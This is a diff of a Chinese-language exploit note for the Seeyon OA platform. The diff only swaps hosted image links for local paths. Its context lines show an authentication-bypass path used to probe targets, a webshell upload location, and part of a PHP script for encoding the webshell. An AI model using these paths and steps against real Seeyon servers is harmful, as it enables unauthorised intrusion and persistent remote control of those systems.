@@ -23,7 +23,7 @@
 /seeyon/thirdpartyController.do.css/..;/ajax.do
 ```
 
-![image-20220520153552230](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201535264.png)
+![image-20220520153552230](./images/202205201535264.png)
 
 查看是否出现如上图异常，若存在则可能出现漏洞
 
@@ -75,11 +75,11 @@ webshell地址: /seeyon/apps_res/addressbook/images/config.jspx
 }
 ```
 
-![image-20220520153614624](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201536701.png)
+![image-20220520153614624](./images/202205201536701.png)
 
 上传后请求webshell地址，访问返回出现如下图则成功写入
 
-![image-20220520153624056](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201536087.png)
+![image-20220520153624056](./images/202205201536087.png)
 
 文件编码脚本, 自行进行自定义调试
 
@@ -102,4 +102,4 @@ echo $webshell;
 ?>
 ```
 
-![image-20220520153713877](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201537962.png)
+![image-20220520153713877](./images/202205201537962.png)
